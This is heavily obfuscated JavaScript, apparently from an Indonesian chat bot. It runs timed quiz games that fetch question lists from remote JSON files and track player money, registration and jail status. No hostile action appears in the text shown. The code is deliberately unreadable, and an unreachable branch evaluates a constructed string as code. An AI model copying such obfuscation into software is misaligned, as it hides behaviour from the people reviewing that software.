_0x1ce978[_0x240d04(0x1087)]:{if(activeGame[_0xb65b97]){if(_0x1ce978[_0x240d04(0x361)]!==_0x1ce978[_0x240d04(0x361)])_0x3eefba=_0x3edce9[_0x240d04(0x17e3)],_0x321de0=_0x538d6c['video'][_0x240d04(0x2321)]||_0x240d04(0x4f4),_0x437449=_0x2e4c49['video'][_0x240d04(0x8f8)]||_0x1ce978['DXhwJ'];else return _0x1ce978[_0x240d04(0x1cf3)](_0x476bfb,_0x1ce978['iOIVV']);}try{if(_0x1ce978['zQrOZ'](_0x240d04(0x24d4),_0x1ce978['QRQrD']))return _0x1ce978['DdEFf'](_0x5c0838,'❌\x20Uang\x20kam'+_0x240d04(0x47b)+'kup\x20untuk\x20'+'membayar\x20d'+_0x240d04(0x12cd)+_0x240d04(0x1db4)+'\x20'+_0x935a4b[_0x240d04(0x17bf)+_0x240d04(0x1743)]());else{const _0xa3c37e=await _0x1ce978[_0x240d04(0x2407)](_0x182219),_0x23dec7=_0xa3c37e[_0xb65b97]=_0xa3c37e[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x23dec7||!_0x23dec7[_0x240d04(0x2eea)]||!_0x23dec7[_0x240d04(0x634)]){if(_0x1ce978[_0x240d04(0x288a)]===_0x1ce978[_0x240d04(0x5d8)])_0x58421c[_0x240d04(0x15e)](_0x511277),_0x1ce978[_0x240d04(0x17b4)](_0x5cdb05,_0x1ce978[_0x240d04(0x153d)]);else return _0x1ce978[_0x240d04(0x13a6)](_0x476bfb,_0x1ce978['KdBjs']);}if(_0x23dec7[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0xa0d)](_0x476bfb,_0x1ce978[_0x240d04(0x1453)]);const _0x295a30=await _0x1ce978[_0x240d04(0x27e7)](fetch,_0x1ce978[_0x240d04(0x1709)])['then'](_0x28a4ef=>_0x28a4ef['json']()),_0x46d2c4=_0x295a30[Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*_0x295a30['length'])],_0x5a18b9=_0x46d2c4[_0x240d04(0x13cb)][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x5a18b9,'startedAt':Date['now'](),'type':_0x240d04(0x1730),'hintUsed':![]},await _0x1ce978['KwYyt'](_0x476bfb,_0x240d04(0x261b)+_0x46d2c4['soal']+('\x0a\x0aGunakan\x20'+_0x240d04(0x2e68)+_0x240d04(0x128d)+_0x240d04(0x687)+_0x240d04(0x23f9)+'\x20menyerah.'+_0x240d04(0x1768)+_0x240d04(0x25ea)+'!'),{'parse_mode':_0x240d04(0x21a9)}),setTimeout(()=>{const _0x3d9d2e=_0x240d04;if(activeGame[_0xb65b97]&&_0x1ce978[_0x3d9d2e(0x2a22)](_0x1ce978[_0x3d9d2e(0x1b06)](Date[_0x3d9d2e(0x104e)](),activeGame[_0xb65b97][_0x3d9d2e(0x1e3f)]),0xea60)){if(_0x1ce978['xrNLc'](_0x3d9d2e(0x1ac7),_0x1ce978[_0x3d9d2e(0xa7b)]))_0x1ce978[_0x3d9d2e(0x129d)](_0x476bfb,_0x3d9d2e(0xb17)+_0x3d9d2e(0x2a04)+'an:\x20*'+_0x2ca95e(_0x5a18b9)+'*'),delete activeGame[_0xb65b97];else{const _0x4899ce=_0x1d2c3d[_0x3d9d2e(0x1121)](_0x24514a)[_0x3d9d2e(0xfc3)](([_0x3633a4,_0x10b6d9])=>(_0x4fa779[_0x3633a4]||0x0)<_0x10b6d9)[_0x3d9d2e(0x16e6)](([_0x67f5b5,_0x5812d5])=>'•\x20'+(_0x5812d5-(_0x1f5902[_0x67f5b5]||0x0))+'\x20'+_0x23bc61(_0x67f5b5));return _0x1ce978[_0x3d9d2e(0x1fed)](_0x436e14,'❌\x20Bahan\x20ti'+'dak\x20cukup\x20'+_0x3d9d2e(0x2cc1)+_0x3d9d2e(0xfa0)+_0x1ce978[_0x3d9d2e(0x1b82)](_0x365605,_0x54f579)+(_0x3d9d2e(0xdde)+'urang:\x0a')+_0x4899ce[_0x3d9d2e(0x86e)]('\x0a'));}}},0xea60);}}catch(_0x3b1752){if(_0x1ce978['ZtJlC'](_0x1ce978[_0x240d04(0x2a93)],_0x1ce978['wVatc']))return _0x1ce978[_0x240d04(0x346)](_0x49d45d,_0x1ce978[_0x240d04(0x1453)]);else console[_0x240d04(0x15e)](_0x3b1752),_0x1ce978['ttEAN'](_0x476bfb,_0x1ce978['vchiT']);}}break;case _0x1ce978[_0x240d04(0x271c)]:{if(activeGame[_0xb65b97])return _0x1ce978['HQZlQ'](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]);try{const _0x483afe=await _0x1ce978[_0x240d04(0x50b)](_0x182219),_0x3e54c1=_0x483afe[_0xb65b97]=_0x483afe[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x3e54c1||!_0x3e54c1[_0x240d04(0x2eea)]||!_0x3e54c1[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x1363)](_0x1ce978[_0x240d04(0xd94)],_0x1ce978['rRhpq'])?_0x579b6c(_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+_0x240d04(0x2cfd)+_0x240d04(0x163d)+'ai.'):_0x1ce978[_0x240d04(0xa04)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x3e54c1[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x266f)](_0x476bfb,_0x1ce978['sQGDl']);const _0x539568=await _0x1ce978['vSCze'](fetch,_0x1ce978[_0x240d04(0xa1e)])[_0x240d04(0xefe)](_0x685dba=>_0x685dba[_0x240d04(0x1314)]()),_0x414887=_0x539568[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x692)](Math[_0x240d04(0x24f1)](),_0x539568[_0x240d04(0x2b45)]))],_0x5b765a=_0x414887[_0x240d04(0x13cb)][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x5b765a,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978[_0x240d04(0x271c)],'hintUsed':![]},await _0x1ce978[_0x240d04(0x1738)](_0x476bfb,'Soal:'+_0x414887[_0x240d04(0x2461)]+(_0x240d04(0x2671)+_0x240d04(0x2e68)+_0x240d04(0x128d)+_0x240d04(0x687)+_0x240d04(0x23f9)+'\x20menyerah.'+'\x0aKamu\x20puny'+_0x240d04(0x25ea)+'!'),{'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),_0x1ce978['LePLz'](setTimeout,()=>{const _0x21df1f=_0x240d04,_0x1b0c99={'hRXtL':function(_0x17a456,_0x5bc459){return _0x17a456(_0x5bc459);},'xEHHO':_0x1ce978['KdBjs']};if(_0x1ce978[_0x21df1f(0x2d14)](_0x1ce978[_0x21df1f(0x48d)],_0x1ce978[_0x21df1f(0x4f8)]))return _0x1b0c99[_0x21df1f(0x208)](_0x2a8024,_0x1b0c99['xEHHO']);else activeGame[_0xb65b97]&&_0x1ce978[_0x21df1f(0x17a9)](_0x1ce978[_0x21df1f(0x532)](Date['now'](),activeGame[_0xb65b97]['startedAt']),0xea60)&&(_0x1ce978[_0x21df1f(0x1c25)](_0x476bfb,_0x21df1f(0xb17)+_0x21df1f(0x2a04)+_0x21df1f(0x26d4)+_0x1ce978[_0x21df1f(0x2b4e)](_0x2ca95e,_0x5b765a)+'*'),delete activeGame[_0xb65b97]);},0xea60);}catch(_0xd23121){console[_0x240d04(0x15e)](_0xd23121),_0x1ce978[_0x240d04(0x25d6)](_0x476bfb,_0x1ce978[_0x240d04(0x2e63)]);}}break;case _0x1ce978[_0x240d04(0x2bcb)]:{if(activeGame[_0xb65b97])return _0x1ce978['ciCyq'](_0x1ce978[_0x240d04(0x1f6c)],_0x1ce978[_0x240d04(0x1f6c)])?_0x476bfb(_0x1ce978[_0x240d04(0x24a8)]):_0x1ce978['oeRNk'](_0x380ca3,'⚠️\x20Kamu\x20sed'+_0x240d04(0x23ea)+'n\x20game\x20lai'+_0x240d04(0x24a2)+_0x240d04(0x2163)+_0x240d04(0x951)+_0x240d04(0x13eb));try{const _0x2032f5=await _0x182219(),_0x176916=_0x2032f5[_0xb65b97]=_0x2032f5[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x176916||!_0x176916['nama']||!_0x176916[_0x240d04(0x634)]){if(_0x1ce978[_0x240d04(0x8a6)](_0x1ce978[_0x240d04(0xd3)],_0x1ce978[_0x240d04(0x179)]))_0x1ce978[_0x240d04(0x17a)](_0x16d0d6,_0x41adc8,_0x193ca6[_0x240d04(0x2b45)],_0x240d04(0x2105));else return _0x1ce978['MyGlP'](_0x476bfb,_0x1ce978['KdBjs']);}if(_0x176916[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x1ecc)](_0x476bfb,'⛓️\x20Kamu\x20sed'+'ang\x20dipenj'+_0x240d04(0x13c8)+_0x240d04(0xd01)+_0x240d04(0xea7)+_0x240d04(0x156f)+_0x240d04(0x254)+'ar.');const _0x4ba1db=await fetch(_0x1ce978[_0x240d04(0x2dac)])[_0x240d04(0xefe)](_0x2e16b8=>_0x2e16b8[_0x240d04(0x1314)]()),_0x56fa21=_0x4ba1db[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x2ab5)](Math[_0x240d04(0x24f1)](),_0x4ba1db[_0x240d04(0x2b45)]))],_0x3f3454=_0x56fa21[_0x240d04(0x13cb)]['toLowerCas'+'e']();activeGame[_0xb65b97]={'answer':_0x3f3454,'startedAt':Date['now'](),'type':_0x240d04(0x1e35),'hintUsed':![]},_0x1ce978[_0x240d04(0x2cee)](_0x476bfb,_0x240d04(0x29dc)+_0x56fa21['soal']+('*\x0a\x0aGunakan'+_0x240d04(0x28b6)+_0x240d04(0x1b69)+'an\x20atau\x20*s'+_0x240d04(0x115e)+_0x240d04(0x2ba6)+_0x240d04(0x19b1)+_0x240d04(0x1b25)+'k!'),{'parse_mode':_0x240d04(0x21a9)}),_0x1ce978[_0x240d04(0xcfb)](setTimeout,()=>{const _0x28713c=_0x240d04,_0x1dbb6f={'IYgaL':function(_0x2febf3,_0x45e235){const _0x2ad417=a0_0x1014;return _0x1ce978[_0x2ad417(0x15d8)](_0x2febf3,_0x45e235);},'KtAsN':_0x28713c(0x2720)+_0x28713c(0x26ea)+'URL\x20gambar'+'.'};if(_0x1ce978['mqAFU']===_0x1ce978[_0x28713c(0x2e08)])activeGame[_0xb65b97]&&_0x1ce978[_0x28713c(0x11a8)](_0x1ce978[_0x28713c(0x331)](Date[_0x28713c(0x104e)](),activeGame[_0xb65b97][_0x28713c(0x1e3f)]),0x7530)&&(_0x1ce978[_0x28713c(0x2b44)](_0x476bfb,_0x28713c(0xb17)+_0x28713c(0x2a04)+_0x28713c(0x26d4)+_0x1ce978[_0x28713c(0x2a63)](_0x2ca95e,_0x3f3454)+'*'),delete activeGame[_0xb65b97]);else return _0x1dbb6f[_0x28713c(0x2b90)](_0x2f177b,_0x1dbb6f[_0x28713c(0x551)]);},0x7530);}catch(_0x32fc07){_0x1ce978[_0x240d04(0x2e75)](_0x240d04(0x20e7),_0x240d04(0x20e7))?_0x1ce978[_0x240d04(0xb74)](_0x8bd123,_0x8c816d,_0x29e6d6[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2a69)]):(console[_0x240d04(0x15e)](_0x32fc07),_0x1ce978[_0x240d04(0xf4c)](_0x476bfb,_0x1ce978[_0x240d04(0x2e63)]));}}break;case _0x240d04(0x2a1b):{if(activeGame[_0xb65b97])return'UrAAg'!==_0x1ce978[_0x240d04(0x2d33)]?_0x3bc6a7[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x165f)](_0x4dd1b8/0.3,0x2)):_0x1ce978[_0x240d04(0x2bb2)](_0x476bfb,_0x240d04(0xecc)+_0x240d04(0x23ea)+_0x240d04(0x1309)+_0x240d04(0x24a2)+_0x240d04(0x2163)+_0x240d04(0x951)+'rah.');try{if(_0x1ce978[_0x240d04(0x1b02)](_0x240d04(0x3ca),_0x1ce978['LpNQb'])){const _0x2d7313=_0x1ce978['iBwJc'](_0x1ce978['SIDEA'](_0x1ce978[_0x240d04(0x1c5b)](_0x3d7176[_0x240d04(0x1fa1)](),_0x2e6e95[_0x240d04(0x2b6b)]()),_0x10d01b[_0x240d04(0x1fa1)]()),0x64),_0x36fe6d=_0x1ce978[_0x240d04(0x1c5b)](_0x3a5a26[_0x240d04(0x104e)](),_0x1cc84a),_0x4e319e='*「\x20STATUS\x20'+_0x240d04(0x29ba)+'*Uptime\x20Se'+_0x240d04(0x2017)+_0x1c57f9+('\x0a📡\x20*Latenc'+_0x240d04(0x2641))+_0x36fe6d['toFixed'](0x2)+(_0x240d04(0x2c0c)+_0x240d04(0x114a))+_0x1ce978['idNYL'](_0x49ce18,0x64)[_0x240d04(0x22f3)](0x2)+(_0x240d04(0x23b6)+'sage:*\x20')+_0x2d7313['toFixed'](0x2)+'%';_0x1ce978[_0x240d04(0x24ef)](_0x31f55a,_0x4e319e);}else{const _0x1c136e=await _0x182219(),_0x1ebeff=_0x1c136e[_0xb65b97]=_0x1c136e[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x1ebeff||!_0x1ebeff['nama']||!_0x1ebeff[_0x240d04(0x634)])return _0x1ce978['NUOUL'](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x1ebeff[_0x240d04(0x2344)])return _0x1ce978['iORks']===_0x1ce978[_0x240d04(0x16e5)]?_0x452300(_0x1ce978[_0x240d04(0x24a8)]):_0x476bfb(_0x1ce978[_0x240d04(0x1453)]);const _0x59e953=await fetch(_0x1ce978['vJZht'])[_0x240d04(0xefe)](_0x388243=>_0x388243['json']()),_0xaa61f3=_0x59e953[Math['floor'](Math[_0x240d04(0x24f1)]()*_0x59e953[_0x240d04(0x2b45)])],_0x1c2037=_0xaa61f3['unsur'][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x1c2037,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978[_0x240d04(0xe74)],'hintUsed':![]},_0x1ce978[_0x240d04(0x1b17)](_0x476bfb,_0x240d04(0x106e)+_0x240d04(0x25fd)+_0x240d04(0x1fdd)+_0xaa61f3[_0x240d04(0x1b5a)]+(_0x240d04(0x18b0)+_0x240d04(0x2671)+_0x240d04(0x2e68)+_0x240d04(0x128d)+_0x240d04(0x687)+_0x240d04(0x23f9)+_0x240d04(0x134)+_0x240d04(0x1768)+_0x240d04(0x1873)+'k!'),{'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),_0x1ce978[_0x240d04(0x5b5)](setTimeout,()=>{const _0x426576=_0x240d04;_0x1ce978[_0x426576(0x1c08)](_0x1ce978[_0x426576(0x184e)],_0x1ce978[_0x426576(0x184e)])?(_0x11ba26=_0xd8b778[_0x426576(0x2ab6)],_0x4297af=_0x5eb95d['file_name']||_0x1ce978[_0x426576(0x233)],_0x377b34=_0x2b3190[_0x426576(0x8f8)]||_0x1ce978[_0x426576(0x1831)]):activeGame[_0xb65b97]&&_0x1ce978[_0x426576(0x1c5b)](Date[_0x426576(0x104e)](),activeGame[_0xb65b97][_0x426576(0x1e3f)])>=0x1d4c0&&(_0x1ce978[_0x426576(0x398)](_0x1ce978['rHapd'],_0x426576(0xeb4))?(_0x1ce978[_0x426576(0x14fc)](_0x476bfb,'⏱️\x20Waktu\x20ha'+'bis!\x20Jawab'+'an:\x20*'+_0x2ca95e(_0x1c2037)+'*'),delete activeGame[_0xb65b97]):_0x16964e(_0x1ce978['asNVy']));},0x1d4c0);}}catch(_0x540c33){if(_0x1ce978[_0x240d04(0x2a02)](_0x240d04(0x188),_0x240d04(0x188)))return _0xe0eea9[_0x240d04(0x1c39)]('')['map']((_0x3dc614,_0x48f1e6)=>{const _0xeb04aa=_0x240d04;if(_0x3dc614==='\x20')return'\x20';return _0x1ce978[_0xeb04aa(0xa7d)](_0x1ce978[_0xeb04aa(0x2e9e)](_0x48f1e6,0x2),0x0)?_0x3dc614:'_';})['join']('');else console['error'](_0x540c33),_0x476bfb(_0x1ce978[_0x240d04(0x2e63)]);}}break;case _0x1ce978['bfJcz']:{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0xa28)](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]);try{const _0x143811=await _0x1ce978[_0x240d04(0x24f6)](_0x182219),_0x4de134=_0x143811[_0xb65b97]=_0x143811[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x4de134||!_0x4de134[_0x240d04(0x2eea)]||!_0x4de134[_0x240d04(0x634)])return _0x1ce978['KFnGE']===_0x1ce978['KFnGE']?_0x1ce978[_0x240d04(0xf2f)](_0x476bfb,_0x1ce978['KdBjs']):_0x1ce978[_0x240d04(0xdae)](_0x4edc78['charAt'](0x0)[_0x240d04(0xdd3)+'e'](),_0x3402a0[_0x240d04(0x728)](0x1));if(_0x4de134[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x252e)](_0x240d04(0x175c),_0x1ce978['Xgcxj'])?_0x39d82a(_0x1ce978[_0x240d04(0x257a)]):_0x476bfb(_0x1ce978[_0x240d04(0x1453)]);const _0x1340f3=await fetch(_0x1ce978[_0x240d04(0x17f3)])[_0x240d04(0xefe)](_0x473df6=>_0x473df6[_0x240d04(0x1314)]()),_0x38b4f8=_0x1340f3[Math['floor'](_0x1ce978[_0x240d04(0x12fb)](Math['random'](),_0x1340f3[_0x240d04(0x2b45)]))],_0x4e1023=_0x38b4f8['judul'][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x4e1023,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978[_0x240d04(0x2bcf)],'hintUsed':![]},await _0x23c0de[_0x240d04(0x1566)+_0x240d04(0x221f)]({'url':_0x38b4f8[_0x240d04(0xffe)],'filename':_0x1ce978[_0x240d04(0x922)]}),await _0x1ce978[_0x240d04(0x2a2d)](_0x476bfb,_0x240d04(0x153c)+_0x240d04(0x9e8)+'rtis:'+_0x38b4f8['artis']+('\x0a*Judul\x20:\x20'+'_____*\x0aGun'+_0x240d04(0x2891)+'*\x20jika\x20kes'+_0x240d04(0x1cec)+_0x240d04(0x1271)+_0x240d04(0x1f26)+'erah.\x0aKamu'+_0x240d04(0xdb5)+_0x240d04(0x13f7)),{'parse_mode':_0x1ce978['AWHzb']}),_0x1ce978[_0x240d04(0x26d)](setTimeout,()=>{const _0x5f35b8=_0x240d04;if(activeGame[_0xb65b97]&&_0x1ce978[_0x5f35b8(0x11a8)](_0x1ce978[_0x5f35b8(0x450)](Date[_0x5f35b8(0x104e)](),activeGame[_0xb65b97][_0x5f35b8(0x1e3f)]),0xea60)){if(_0x1ce978['UhIUZ'](_0x1ce978[_0x5f35b8(0x2cab)],_0x5f35b8(0x2482)))_0x1ce978['MyIPQ'](_0x476bfb,_0x5f35b8(0xb17)+_0x5f35b8(0x2a04)+_0x5f35b8(0x26d4)+_0x2ca95e(_0x4e1023)+'*'),delete activeGame[_0xb65b97];else{const _0x1c5767=_0x1ce978[_0x5f35b8(0x5a5)](_0x422f7c-_0x168314,0x186a0);_0x1a5d80['money']=_0x14b890[_0x5f35b8(0x1c2f)](0x0,_0x27b7fd[_0x5f35b8(0xd24)]-_0x1c5767),_0x89e038[_0x5f35b8(0xc80)]+=0x1,_0x1ce978[_0x5f35b8(0xb61)](_0x2635af,_0x5f35b8(0x22f4)+_0x3cef6a+_0x5f35b8(0x6e5)+_0x1ce978[_0x5f35b8(0x23a6)](_0x5099dd,0xa)+_0x5f35b8(0x1ca8)+_0x3a2b0c*0xa+']\x20*'+_0x257cad+('*\x0a\x0a*Kamu\x20k'+_0x5f35b8(0x1f0b)+_0x5f35b8(0x2360))+_0x1f6cd2[_0x1ce978[_0x5f35b8(0x2848)](_0x3a66ef,0x0,_0x233b3f[_0x5f35b8(0x2b45)]-0x1)]+_0x5f35b8(0x11ff)+_0x1c5767[_0x5f35b8(0x17bf)+'ring']()+(_0x5f35b8(0x26dc)+'t'));}}},0xea60);}catch(_0x87b546){console['error'](_0x87b546),_0x1ce978['IHhMN'](_0x476bfb,_0x1ce978[_0x240d04(0x2e63)]);}}break;case _0x1ce978[_0x240d04(0xa1f)]:{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0x28d1)](_0x476bfb,'⚠️\x20Kamu\x20sed'+_0x240d04(0x23ea)+_0x240d04(0x1309)+_0x240d04(0x24a2)+'\x20*suren*\x20u'+_0x240d04(0x951)+_0x240d04(0x13eb));try{const _0x2a3b3a=await _0x1ce978['zjvDs'](_0x182219),_0x4a21de=_0x2a3b3a[_0xb65b97]=_0x2a3b3a[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x4a21de||!_0x4a21de[_0x240d04(0x2eea)]||!_0x4a21de[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x28e6)](_0x476bfb,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+_0x240d04(0x2cfd)+_0x240d04(0x163d)+'ai.');if(_0x4a21de[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0xf91)](_0x476bfb,_0x1ce978['sQGDl']);const _0x26bdf1=await _0x1ce978['BJPTN'](fetch,_0x240d04(0xd7d)+'w.githubus'+'ercontent.'+'com/NdikzO'+_0x240d04(0x1c3f)+'fs/heads/m'+_0x240d04(0x284a)+_0x240d04(0x723))[_0x240d04(0xefe)](_0x4410fe=>_0x4410fe[_0x240d04(0x1314)]()),_0x4bb994=_0x26bdf1[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x125f)](Math[_0x240d04(0x24f1)](),_0x26bdf1['length']))],_0x52ab7b=_0x4bb994[_0x240d04(0x13cb)]['toLowerCas'+'e']();activeGame[_0xb65b97]={'answer':_0x52ab7b,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978[_0x240d04(0xa1f)],'hintUsed':![]},await _0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x4bb994[_0x240d04(0xd15)]},{'caption':_0x240d04(0x2ce2)+_0x240d04(0x1324)+':'+_0x4bb994[_0x240d04(0xc9d)]+(_0x240d04(0x2671)+_0x240d04(0x2e68)+_0x240d04(0x128d)+_0x240d04(0x687)+'ren*\x20untuk'+_0x240d04(0x134)+_0x240d04(0x1768)+_0x240d04(0x25ea)+'!'),'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),_0x1ce978[_0x240d04(0x2be0)](setTimeout,()=>{const _0xfc5861=_0x240d04,_0x3c1c87={'BxZtE':_0x1ce978[_0xfc5861(0x2801)]};if(_0xfc5861(0x1fe3)===_0x1ce978[_0xfc5861(0x27b)])return _0x427030(_0x3c1c87['BxZtE']);else activeGame[_0xb65b97]&&_0x1ce978[_0xfc5861(0x2e02)](_0x1ce978[_0xfc5861(0x16db)](Date[_0xfc5861(0x104e)](),activeGame[_0xb65b97][_0xfc5861(0x1e3f)]),0x13880)&&(_0x1ce978[_0xfc5861(0x152e)](_0x476bfb,_0xfc5861(0xb17)+_0xfc5861(0x2a04)+_0xfc5861(0x26d4)+_0x1ce978[_0xfc5861(0x2975)](_0x2ca95e,_0x52ab7b)+'*'),delete activeGame[_0xb65b97]);},0x13880);}catch(_0x33ca25){if(_0x1ce978[_0x240d04(0xc7d)](_0x1ce978[_0x240d04(0x2e03)],_0x240d04(0xfa7)))console[_0x240d04(0x15e)](_0x33ca25),_0x1ce978[_0x240d04(0xe66)](_0x476bfb,_0x1ce978[_0x240d04(0x2e63)]);else return _0x1ce978[_0x240d04(0x9a1)](_0x26c5ce,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+'an\x20/daftar'+_0x240d04(0x2cfd)+'\x20untuk\x20mul'+'ai.');}}break;case _0x1ce978[_0x240d04(0x29d4)]:{if(activeGame[_0xb65b97]){if(_0x1ce978[_0x240d04(0x1821)]===_0x1ce978[_0x240d04(0x15ec)])_0x1ce978['tFPjM'](_0x4f1a1d,_0x58ed27,_0x27d053['length'],_0x1ce978['PKHHh']);else return _0x1ce978[_0x240d04(0x2623)](_0x476bfb,_0x1ce978['iOIVV']);}try{if(_0x1ce978[_0x240d04(0x2c7d)](_0x240d04(0x1494),'iAHng')){const _0x2967df=await _0x1ce978[_0x240d04(0x24f6)](_0x182219),_0x41fc10=_0x2967df[_0xb65b97]=_0x2967df[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x41fc10||!_0x41fc10[_0x240d04(0x2eea)]||!_0x41fc10[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x1d18)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x41fc10['jail']){if(_0x1ce978['ZkJBE'](_0x1ce978['DoDpe'],_0x240d04(0xd9b))){let _0x100cbf=_0xc988dc['keys'](_0x1d95d3)[0x0];return _0x240d04(0x2adb)+_0x1ce978[_0x240d04(0x22e0)](_0x580902,_0x359158)+'\x20*'+_0x1ce978[_0x240d04(0x19ad)](_0xf6267a,_0x5d8efe)+_0x240d04(0x19ce)+_0x203819[_0x100cbf]+'\x20'+_0x1ce978[_0x240d04(0xcab)](_0x1ade67,_0x100cbf)+'\x20'+_0x1ce978[_0x240d04(0x18e9)](_0xf32920,_0x100cbf)+'*';}else return _0x476bfb(_0x1ce978[_0x240d04(0x1453)]);}const _0x41e9d3=await _0x1ce978[_0x240d04(0x439)](fetch,_0x1ce978[_0x240d04(0x24ae)])['then'](_0x4a4f6c=>_0x4a4f6c['json']()),_0x12d066=_0x41e9d3[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1e3)](Math[_0x240d04(0x24f1)](),_0x41e9d3['length']))],_0x31a15d=_0x12d066[_0x240d04(0x13cb)][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x31a15d,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978[_0x240d04(0x29d4)],'hintUsed':![]},_0x1ce978[_0x240d04(0x2881)](_0x476bfb,'soal:*'+_0x12d066['soal']+('*\x0a\x0aGunakan'+_0x240d04(0x28b6)+_0x240d04(0x1b69)+'an\x20atau\x20*s'+_0x240d04(0x115e)+_0x240d04(0x2ba6)+_0x240d04(0x19b1)+_0x240d04(0xe33)+'k!'),{'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),_0x1ce978[_0x240d04(0x2594)](setTimeout,()=>{const _0x40e630=_0x240d04,_0x55251c={'CTVcw':function(_0x88abf3,_0x20667d,_0x14bf70){const _0x403c70=a0_0x1014;return _0x1ce978[_0x403c70(0x227f)](_0x88abf3,_0x20667d,_0x14bf70);},'kzNLU':function(_0x28de4d,_0x4b3eed,_0x5b3235){const _0x3f862b=a0_0x1014;return _0x1ce978[_0x3f862b(0x1ea7)](_0x28de4d,_0x4b3eed,_0x5b3235);},'LowFL':function(_0x63138a,_0x39ce31){const _0x3622d1=a0_0x1014;return _0x1ce978[_0x3622d1(0x11fa)](_0x63138a,_0x39ce31);},'KyHBN':function(_0x5b7be6,_0x2adf54){return _0x5b7be6<_0x2adf54;}};if(_0x1ce978['eOuUl'](_0x40e630(0x22ac),_0x1ce978[_0x40e630(0xa50)])){if(activeGame[_0xb65b97]&&_0x1ce978[_0x40e630(0x1dbf)](_0x1ce978[_0x40e630(0x16db)](Date[_0x40e630(0x104e)](),activeGame[_0xb65b97]['startedAt']),0xea60)){if(_0x1ce978[_0x40e630(0xcd4)](_0x1ce978[_0x40e630(0xc6a)],_0x1ce978['WuUhC']))_0x1ce978[_0x40e630(0x20f6)](_0x476bfb,_0x40e630(0xb17)+_0x40e630(0x2a04)+'an:\x20*'+_0x2ca95e(_0x31a15d)+'*'),delete activeGame[_0xb65b97];else{const [_0x324c2f,_0x3dae58,_0x44a091,_0x154b99,_0x3ecf16,_0x566ee6,_0x5e8dd3]=_0x12cd79[_0x4b1851];let _0x5886a3=_0x55251c[_0x40e630(0x2d2a)](_0x2087c6,_0x324c2f,_0x3dae58),_0x3c40ed=_0x55251c['kzNLU'](_0xc8caab,_0x44a091,_0x154b99),_0x5a4071=_0x55251c['LowFL'](_0x2f15aa,[..._0x3ecf16]),_0x172853=new _0x43ad5c(_0x40e630(0x2bce)+_0x5886a3+'\x20'+_0x5a4071['replace']('/','*')+'\x20'+(_0x55251c['KyHBN'](_0x3c40ed,0x0)?'('+_0x3c40ed+')':_0x3c40ed))();if(_0x5a4071=='/')[_0x5886a3,_0x172853]=[_0x172853,_0x5886a3];return{'str':_0x5886a3+'\x20'+_0x2e62b1[_0x5a4071]+'\x20'+_0x3c40ed,'mode':_0x222f0b,'time':_0x566ee6,'bonus':_0x5e8dd3,'result':_0x172853};}}}else{const _0x1a95d8={'kepiting':'🦀','lobster':'🦞','udang':'🦐','cumi':'🦑','gurita':'🐙','buntal':'🐡','dory':'🐠','orca':'🐳','lumba':'🐬','paus':'🐋','hiu':'🦈'}[_0x5faf59]||'';return _0x1a95d8+'\x20'+_0x1ce978[_0x40e630(0x16d3)](_0x36f0c9,_0x31f3ae)+':\x20'+_0xe7317a;}},0xea60);}else 